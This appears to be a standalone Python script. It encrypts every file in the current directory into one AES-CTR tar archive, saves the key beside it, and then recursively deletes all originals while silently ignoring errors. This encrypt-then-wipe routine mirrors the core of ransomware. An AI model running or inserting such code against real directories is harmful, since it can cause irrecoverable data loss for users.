import os
import sys
import tarfile
import shutil
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

class TarStream:
    def __init__(self, enc_file, cipher):
        self.enc_file = enc_file
        self.cipher = cipher

    def write(self, data):
        encrypted_data = self.cipher.encrypt(data)
        self.enc_file.write(encrypted_data)

    def flush(self):
        pass

def get_total_size(files):
    total_size = 0
    for file in files:
        total_size += os.path.getsize(file)
    return total_size

def main():
    # Generate AES-256 key and nonce
    key = get_random_bytes(32)
    nonce = get_random_bytes(8)

    # Save the key
    key_filename = "encryption_key.key"
    with open(key_filename, "wb") as f:
        f.write(key)

    # Files to exclude
    script_name = os.path.basename(sys.argv[0])
    output_name = "files.encrypted"
    exclude = {script_name, output_name, key_filename, "decrypt.py"}

    # Get list of files to process
    files_to_process = []
    for root, dirs, files in os.walk(".", topdown=True):
        dirs[:] = [d for d in dirs if d not in exclude]
        files = [f for f in files if f not in exclude]
        for file in files:
            path = os.path.join(root, file)
            files_to_process.append(path)

    # Create encrypted file
    with open(output_name, "wb") as enc_file:
        enc_file.write(nonce)  # Write nonce first
        cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)

        # Stream tar and encrypt
        with tarfile.open(mode="w|", fileobj=TarStream(enc_file, cipher)) as tar:
            for file in files_to_process:
                arcname = os.path.relpath(file, start=".")
                tar.add(file, arcname=arcname)

    # Delete original files and directories
    cwd = os.getcwd()
    for item in os.listdir(cwd):
        if item in exclude:
            continue
        item_path = os.path.join(cwd, item)
        try:
            if os.path.isfile(item_path) or os.path.islink(item_path):
                os.remove(item_path)
            elif os.path.isdir(item_path):
                shutil.rmtree(item_path)
        except Exception:
            pass  # Silently handle errors

if __name__ == "__main__":
    main()